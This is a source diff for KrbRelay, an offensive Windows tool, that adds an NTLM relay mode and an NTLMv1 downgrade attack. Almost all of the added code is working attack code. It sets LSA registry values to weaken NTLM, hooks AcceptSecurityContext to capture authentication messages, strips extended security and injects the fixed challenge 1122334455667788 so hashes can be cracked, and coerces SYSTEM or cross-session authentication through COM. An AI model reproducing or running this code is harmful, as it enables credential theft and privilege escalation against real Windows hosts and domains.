@@ -1,5 +1,6 @@
 ﻿using KrbRelay.Clients;
 using KrbRelay.Com;
+using Microsoft.Win32;
 using NetFwTypeLib;
 using SMBLibrary;
 using SMBLibrary.Client;
@@ -83,22 +84,83 @@ namespace KrbRelay
                 relayedUser = Environment.MachineName + "$";
                 relayedUserDomain = domainDN.Replace(",", ".").Replace("DC=", "");
             }
-            Console.WriteLine("[*] Relaying context: {0}\\{1}", relayedUserDomain, relayedUser);
+            if (string.IsNullOrEmpty(targetFQDN))
+            {
+                Console.WriteLine("[*] Auth Context: {0}\\{1}", relayedUserDomain, relayedUser);
+            }
+            else
+            {
+                Console.WriteLine("[*] Relaying context: {0}\\{1}", relayedUserDomain, relayedUser);
+            }
         }
 
-        
+
+        //
+        private static void GetRegKey(string key, string name, out object result)
+        {
+            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
+            if (Lsa != null)
+            {
+                object value = Lsa.GetValue(name);
+                if (value != null)
+                {
+                    result = value;
+                    return;
+                }
+            }
+            result = null;
+        }
+        private static void SetRegKey(string key, string name, object value)
+        {
+            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
+            if (Lsa != null)
+            {
+                if (value == null)
+                {
+                    Lsa.DeleteValue(name);
+                }
+                else
+                {
+                    Lsa.SetValue(name, value);
+                }
+            }
+        }
+        private static void SetDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
+        {
+            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out oldValue_LMCompatibilityLevel);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);
+
+            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", out oldValue_NtlmMinClientSec);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912);
+
+            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", out oldValue_RestrictSendingNTLMTraffic);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
+        }
+        private static void RestoreDowngrade(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)
+        {
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
+        }
+
         public static SECURITY_HANDLE ldap_phCredential = new SECURITY_HANDLE();
         public static IntPtr ld = IntPtr.Zero;
+        public static byte[] ntlm1 = new byte[] { };
+        public static byte[] ntlm2 = new byte[] { };
+        public static byte[] ntlm3 = new byte[] { };
         public static byte[] apRep1 = new byte[] { };
         public static byte[] apRep2 = new byte[] { };
         public static byte[] ticket = new byte[] { };
         public static string spn = "";
         public static string relayedUser = "";
         public static string relayedUserDomain = "";
+        public static string domain = "";
         public static string domainDN = "";
         public static string targetFQDN = "";
         public static bool useSSL = false;
         public static bool stopSpoofing = false;
+        public static bool downgrade = false;
+        public static bool ntlm = false;
         public static Dictionary<string, string> attacks = new Dictionary<string, string>();
         public static SMB2Client smbClient = new SMB2Client();
         public static HttpClientHandler handler = new HttpClientHandler();
@@ -107,7 +169,7 @@ namespace KrbRelay
 
         //hooked function
         [STAThread]
-        public static SecStatusCode AcceptSecurityContext_(
+        public static SecStatusCode AcceptSecurityContext_kerb(
             [In] SecHandle phCredential,
             [In] SecHandle phContext,
             [In] SecurityBufferDescriptor pInput,
@@ -163,13 +225,13 @@ namespace KrbRelay
             //overwrite security buffer
             var pOutput2 = new SecurityBufferDescriptor(12288);
             //var buffer = new SecurityBufferDescriptor(msgidbytes);
-            var buffer = new SecurityBuffer(apRep1);
-            int size = Marshal.SizeOf(buffer);
-            int size2 = apRep1.Length;
-            var BufferPtr = Marshal.AllocHGlobal(size);
-            Marshal.StructureToPtr(buffer, BufferPtr, false);
-            byte[] BufferBytes = new byte[size];
-            Marshal.Copy(BufferPtr, BufferBytes, 0, size);
+            //var buffer = new SecurityBuffer(apRep1);
+            //int size = Marshal.SizeOf(buffer);
+            //int size2 = apRep1.Length;
+            //var BufferPtr = Marshal.AllocHGlobal(size);
+            //Marshal.StructureToPtr(buffer, BufferPtr, false);
+            //byte[] BufferBytes = new byte[size];
+            //Marshal.Copy(BufferPtr, BufferBytes, 0, size);
             var ogSecDesc = (SecurityBufferDescriptor)Marshal.PtrToStructure(pOutput, typeof(SecurityBufferDescriptor));
             var ogSecBuffer = (SecurityBuffer)Marshal.PtrToStructure(ogSecDesc.BufferPtr, typeof(SecurityBuffer));
 
@@ -190,6 +252,131 @@ namespace KrbRelay
                 byte[] nbytes = new byte[254];
                 Marshal.Copy(apRep1, 0, ogSecBuffer.Token + 116, apRep1.Length); // verify this 116 offset?
                 Marshal.Copy(nbytes, 0, (IntPtr)ogSecBuffer.Token + apRep1.Length + 116, nbytes.Length);
+            }
+
+            Console.WriteLine("[*] AcceptSecurityContext: {0}", ret);
+            Console.WriteLine("[*] fContextReq: {0}", fContextReq);
+
+            return ret;
+        }
+
+        public static SecStatusCode AcceptSecurityContext_ntlm(
+            [In] SecHandle phCredential,
+            [In] SecHandle phContext,
+            [In] SecurityBufferDescriptor pInput,
+            AcceptContextReqFlags fContextReq,
+            SecDataRep TargetDataRep,
+            [In, Out] SecHandle phNewContext,
+            [In, Out] IntPtr pOutput,
+            out AcceptContextRetFlags pfContextAttr,
+            [Out] SECURITY_INTEGER ptsExpiry)
+        {
+            if (ntlm1.Length == 0)
+            {
+                ntlm1 = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
+                int ntlm1Pattern = Helpers.PatternAt(ntlm1, new byte[] { 0x4e, 0x54 });
+                ntlm1 = ntlm1.Skip(ntlm1Pattern).ToArray();
+                Console.WriteLine("[*] NTLM1");
+                Console.WriteLine(Helpers.ByteArrayToString(ntlm1));
+                ticket = ntlm1;
+            }
+            else
+            {
+                ntlm3 = pInput.ToByteArray().Take(pInput.ToByteArray().Length - 32).ToArray();
+                int ntlm3Pattern = Helpers.PatternAt(ntlm3, new byte[] { 0x4e, 0x54 });
+                ntlm3 = ntlm3.Skip(ntlm3Pattern).ToArray();
+                ticket = ntlm3;
+
+                if (ntlm2.Length > 1 && ntlm3.Length > 1)
+                {
+                    Helpers.parseNTLM(ntlm2, ntlm3);
+                }
+                if (string.IsNullOrEmpty(targetFQDN))
+                {
+                    pfContextAttr = AcceptContextRetFlags.None;
+                    return SecStatusCode.SEC_E_LOGON_DENIED;
+                }
+            }
+
+            //string service = spn.Split('/').First();
+            //if (service.ToLower() == "ldap")
+            //{
+            //    Ldap.Connect();
+            //}
+            //else if (service.ToLower() == "http")
+            //{
+            //    Http.Connect();
+            //}
+            //else if (service.ToLower() == "cifs")
+            //{
+            //    Smb.Connect();
+            //}
+
+            //overwrite security buffer
+            var pOutput2 = new SecurityBufferDescriptor(12288);
+            var ogSecDesc = (SecurityBufferDescriptor)Marshal.PtrToStructure(pOutput, typeof(SecurityBufferDescriptor));
+            var ogSecBuffer = (SecurityBuffer)Marshal.PtrToStructure(ogSecDesc.BufferPtr, typeof(SecurityBuffer));
+
+            SecStatusCode ret;
+            if (!string.IsNullOrEmpty(targetFQDN))
+            {
+                ret = AcceptSecurityContext(
+                phCredential,
+                phContext,
+                pInput,
+                fContextReq,
+                TargetDataRep,
+                phNewContext,
+                pOutput2,
+                out pfContextAttr,
+                ptsExpiry);
+            }
+            else
+            {
+                ret = AcceptSecurityContext(
+                phCredential,
+                phContext,
+                pInput,
+                fContextReq,
+                TargetDataRep,
+                phNewContext,
+                pOutput,
+                out pfContextAttr,
+                ptsExpiry);
+            }
+
+            var ogSecDesc2 = (SecurityBufferDescriptor)Marshal.PtrToStructure(pOutput, typeof(SecurityBufferDescriptor));
+            var ogSecBuffer2 = (SecurityBuffer)Marshal.PtrToStructure(ogSecDesc2.BufferPtr, typeof(SecurityBuffer));
+            byte[] ntlm2bytes = ogSecDesc2.ToByteArray();
+            int ntlm2Pattern = Helpers.PatternAt(ntlm2bytes, new byte[] { 0x4e, 0x54 });
+
+            if (downgrade)
+            {
+                //disable extended security
+                byte temp = (byte)(Marshal.ReadByte(ogSecBuffer2.Token + ntlm2Pattern + 22) & 0xF7);
+                Marshal.WriteByte(ogSecBuffer2.Token + ntlm2Pattern + 22, 0, temp);
+
+                //replace challenge
+                byte[] challengebytes = Helpers.StringToByteArray("1122334455667788");
+                Marshal.Copy(challengebytes, 0, (IntPtr)ogSecBuffer2.Token + ntlm2Pattern + 24, challengebytes.Length);
+            }
+
+            if (string.IsNullOrEmpty(targetFQDN))
+            {
+                //null out reserved bytes
+                byte[] nbytes = new byte[8];
+                Marshal.Copy(nbytes, 0, (IntPtr)ogSecBuffer2.Token + ntlm2Pattern + 32, nbytes.Length);
+
+                ntlm2 = ogSecDesc2.ToByteArray();
+                ntlm2 = ntlm2.Skip(ntlm2Pattern).ToArray();
+                Console.WriteLine("[*] NTLM2");
+                Console.WriteLine(Helpers.ByteArrayToString(ntlm2));
+            }
+            else
+            {
+                byte[] nbytess = new byte[254];
+                Marshal.Copy(ntlm2, 0, ogSecBuffer.Token + 116, ntlm2.Length); // verify this 116 offset?
+                Marshal.Copy(nbytess, 0, (IntPtr)ogSecBuffer.Token + ntlm2.Length + 116, nbytess.Length);
             }
 
             Console.WriteLine("[*] AcceptSecurityContext: {0}", ret);
@@ -283,7 +470,6 @@ namespace KrbRelay
         {
             string clsid = "";
             string service = "";
-            string domain = "";
             int sessionID = -123;
             string port = "12345";
             bool show_help = false;
@@ -296,6 +482,16 @@ namespace KrbRelay
 
                 switch (argument)
                 {
+                    case "-NTLM":
+                    case "/NTLM":
+                        ntlm = true;
+                        break;
+
+                    case "-DOWNGRADE":
+                    case "/DOWNGRADE":
+                        downgrade = true;
+                        break;
+
                     //
                     case "-CONSOLE":
                     case "/CONSOLE":
@@ -643,59 +839,47 @@ namespace KrbRelay
                 return;
             }
 
-            if (string.IsNullOrEmpty(spn))
+            if (string.IsNullOrEmpty(spn) && ntlm == false)
             {
                 Console.WriteLine("Missing /spn: parameter");
                 Console.WriteLine("KrbRelay.exe -h for help");
                 return;
             }
 
-
-            if (string.IsNullOrEmpty(domain))
-            {
-                string[] d = spn.Split('.').Skip(1).ToArray();
-                domain = string.Join(".", d);
-            }
-            if (string.IsNullOrEmpty(targetFQDN))
-            {
-                string[] d = spn.Split('/').Skip(1).ToArray();
-                targetFQDN = string.Join(".", d);
-            }
-            var domainComponent = domain.Split('.');
-            foreach (string dc in domainComponent)
-            {
-                domainDN += string.Concat(",DC=", dc);
-            }
-            domainDN = domainDN.TrimStart(',');
-
-            service = spn.Split('/').First().ToLower();
-            if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
-            {
-                Console.WriteLine("'{0}' service not supported", service);
-                Console.WriteLine("choose from CIFS, LDAP and HTTP");
-                return;
-            }
-
-            if (string.IsNullOrEmpty(clsid) && llmnr == false)
+            if (string.IsNullOrEmpty(clsid))
             {
                 Console.WriteLine("Missing /clsid: parameter");
                 Console.WriteLine("KrbRelay.exe -h for help");
                 return;
-
-                // for dev
-                //if (sessionID != -123)
-                //{
-                //    // cross-session
-                //    //clsid = "{354ff91b-5e49-4bdc-a8e6-1cb6c6877182}";
-                //    //clsid = "{38e441fb-3d16-422f-8750-b2dacec5cefc}";
-                //    clsid = "{f8842f8e-dafe-4b37-9d38-4e0714a61149}";
-                //}
-                //else
-                //{
-                //    //system
-                //    clsid = "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}";
-                //}
             }
+
+            if (!string.IsNullOrEmpty(spn))
+            {
+                service = spn.Split('/').First().ToLower();
+                if (!(new List<string> { "ldap", "cifs", "http" }.Contains(service)))
+                {
+                    Console.WriteLine("'{0}' service not supported", service);
+                    Console.WriteLine("choose from CIFS, LDAP and HTTP");
+                    return;
+                }
+                string[] d = spn.Split('.').Skip(1).ToArray();
+                domain = string.Join(".", d);
+
+                string[] dd = spn.Split('/').Skip(1).ToArray();
+                targetFQDN = string.Join(".", dd);
+
+            }
+
+            if (!string.IsNullOrEmpty(domain))
+            {
+                var domainComponent = domain.Split('.');
+                foreach (string dc in domainComponent)
+                {
+                    domainDN += string.Concat(",DC=", dc);
+                }
+                domainDN = domainDN.TrimStart(',');
+            }
+
             if (!string.IsNullOrEmpty(clsid))
                 clsId_guid = new Guid(clsid);
 
@@ -732,7 +916,6 @@ namespace KrbRelay
                 }
 
                 uint LDAP_OPT_ON = 1;
-                uint LDAP_OPT_OFF = 1;
                 uint version = 3;
                 var ldapStatus = ldap_set_option(ld, 0x11, ref version);
 
@@ -849,7 +1032,15 @@ namespace KrbRelay
 
             //overwrite AcceptSecurityContex
             IntPtr hProcess = OpenProcess(0x001F0FFF, false, Process.GetCurrentProcess().Id);
-            AcceptSecurityContextFunc AcceptSecurityContextDeleg = new AcceptSecurityContextFunc(AcceptSecurityContext_);
+            AcceptSecurityContextFunc AcceptSecurityContextDeleg;
+            if (ntlm == true)
+            {
+                AcceptSecurityContextDeleg = new AcceptSecurityContextFunc(AcceptSecurityContext_ntlm);
+            }
+            else
+            {
+                AcceptSecurityContextDeleg = new AcceptSecurityContextFunc(AcceptSecurityContext_kerb);
+            }
             byte[] bAcceptSecurityContext = BitConverter.GetBytes(Marshal.GetFunctionPointerForDelegate(AcceptSecurityContextDeleg).ToInt64());
             int oAcceptSecurityContext = Helpers.FieldOffset<SecurityFunctionTable>("AcceptSecurityContex");
             Marshal.Copy(bAcceptSecurityContext, 0, (IntPtr)functionTable + oAcceptSecurityContext, bAcceptSecurityContext.Length);
@@ -860,10 +1051,17 @@ namespace KrbRelay
             //Console.WriteLine();
             Console.WriteLine("[*] Rewriting PEB");
             //Init RPC server
+            int dwAuthnSvc = 16;
+            string pPrincipalName = spn;
+            if (ntlm == true)
+            {
+                dwAuthnSvc = 10;
+                pPrincipalName = null;
+            }
             var svcs = new SOLE_AUTHENTICATION_SERVICE[] {
                 new SOLE_AUTHENTICATION_SERVICE() {
-                    dwAuthnSvc = 16, // HKLM\SOFTWARE\Microsoft\Rpc\SecurityService sspicli.dll
-                    pPrincipalName = spn
+                    dwAuthnSvc = dwAuthnSvc, // HKLM\SOFTWARE\Microsoft\Rpc\SecurityService sspicli.dll
+                    pPrincipalName = pPrincipalName
                 }
             };
             //bypass firewall restriction by overwriting checks on PEB
@@ -875,7 +1073,7 @@ namespace KrbRelay
             {
                 Console.WriteLine("[*] Init com server");
                 CoInitializeSecurity(IntPtr.Zero, svcs.Length, svcs,
-                     IntPtr.Zero, AuthnLevel.RPC_C_AUTHN_LEVEL_DEFAULT,
+                     IntPtr.Zero, AuthnLevel.RPC_C_AUTHN_LEVEL_CONNECT,
                      ImpLevel.RPC_C_IMP_LEVEL_IMPERSONATE, IntPtr.Zero,
                      Natives.EOLE_AUTHENTICATION_CAPABILITIES.EOAC_DYNAMIC_CLOAKING,
                      IntPtr.Zero);
@@ -918,7 +1116,7 @@ namespace KrbRelay
             //std.SecurityBindings.Add(new COMSecurityBinding(RpcAuthnService.GSS_Kerberos, spn));
 
             RpcServerUseProtseqEp("ncacn_ip_tcp", 20, port, IntPtr.Zero);
-            RpcServerRegisterAuthInfo(null, 16, IntPtr.Zero, IntPtr.Zero);
+            RpcServerRegisterAuthInfo(null, (uint)dwAuthnSvc, IntPtr.Zero, IntPtr.Zero);
 
             // Initialized IStorage
             IStorage stg;
@@ -933,50 +1131,69 @@ namespace KrbRelay
             qis[0].pItf = null;
             qis[0].hr = 0;
 
-            if (sessionID == -123)
+            object oldValue_LMCompatibilityLevel = null;
+            object oldValue_NtlmMinClientSec = null;
+            object oldValue_RestrictSendingNTLMTraffic = null;
+            if (downgrade && ntlm)
             {
-                Console.WriteLine();
-                Console.WriteLine("[*] Forcing SYSTEM authentication");
-                Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);
-                try
+                SetDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic);
+            }
+            try
+            {
+                if (sessionID == -123)
                 {
-                    result = Ole32.CoGetInstanceFromIStorage(null, ref clsId_guid, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);
+                    Console.WriteLine();
+                    Console.WriteLine("[*] Forcing SYSTEM authentication");
+                    Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);
+                    try
+                    {
+                        result = Ole32.CoGetInstanceFromIStorage(null, ref clsId_guid, null, Ole32.CLSCTX.CLSCTX_LOCAL_SERVER, storageTrigger, 1, qis);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                    }
                 }
-                catch (Exception e)
+                else
                 {
-                    Console.WriteLine(e);
+                    Console.WriteLine();
+                    Console.WriteLine("[*] Forcing cross-session authentication");
+                    Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);
+
+                    Guid tmp = new Guid("{00000000-0000-0000-C000-000000000046}");
+                    Guid CLSID_ComActivator = new Guid("{0000033C-0000-0000-c000-000000000046}");
+                    Guid IID_IStandardActivator = typeof(IStandardActivator).GUID;
+                    var pComAct = (IStandardActivator)new StandardActivator();
+                    uint result2 = Ole32.CoCreateInstance(ref CLSID_ComActivator, null, 0x1, ref IID_IStandardActivator, out object instance);
+                    pComAct = (IStandardActivator)instance;
+
+                    if (sessionID != -123)
+                    {
+                        ISpecialSystemPropertiesActivator props = (ISpecialSystemPropertiesActivator)pComAct;
+                        Console.WriteLine("[*] Spawning in session {0}", sessionID);
+                        props.SetSessionId(sessionID, 0, 1);
+                    }
+                    try
+                    {
+                        result = pComAct.StandardGetInstanceFromIStorage(null, clsId_guid, IntPtr.Zero, CLSCTX.LOCAL_SERVER, storageTrigger, 1, qis);
+                    }
+                    catch (Exception e)
+                    {
+                        Console.WriteLine(e);
+                    }
+                    //Console.WriteLine("[*] StandardGetInstanceFromIStoragee: {0}", result);
                 }
             }
-            else
+            catch (Exception e)
             {
-                Console.WriteLine();
-                Console.WriteLine("[*] Forcing cross-session authentication");
-                Console.WriteLine("[*] Using CLSID: {0}", clsId_guid);
-
-                Guid tmp = new Guid("{00000000-0000-0000-C000-000000000046}");
-                Guid CLSID_ComActivator = new Guid("{0000033C-0000-0000-c000-000000000046}");
-                Guid IID_IStandardActivator = typeof(IStandardActivator).GUID;
-                var pComAct = (IStandardActivator)new StandardActivator();
-                uint result2 = Ole32.CoCreateInstance(ref CLSID_ComActivator, null, 0x1, ref IID_IStandardActivator, out object instance);
-                pComAct = (IStandardActivator)instance;
-
-                if (sessionID != -123)
-                {
-                    ISpecialSystemPropertiesActivator props = (ISpecialSystemPropertiesActivator)pComAct;
-                    Console.WriteLine("[*] Spawning in session {0}", sessionID);
-                    props.SetSessionId(sessionID, 0, 1);
-                }
-                try
-                {
-                    result = pComAct.StandardGetInstanceFromIStorage(null, clsId_guid, IntPtr.Zero, CLSCTX.LOCAL_SERVER, storageTrigger, 1, qis);
-                }
-                catch (Exception e)
-                {
-                    Console.WriteLine(e);
-                }
-                //Console.WriteLine("[*] StandardGetInstanceFromIStoragee: {0}", result);
+                Console.WriteLine(e);
             }
             //Marshal.BindToMoniker(std.ToMoniker());
+
+            if (downgrade && ntlm)
+            {
+                RestoreDowngrade(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
+            }
         }
     }
 }
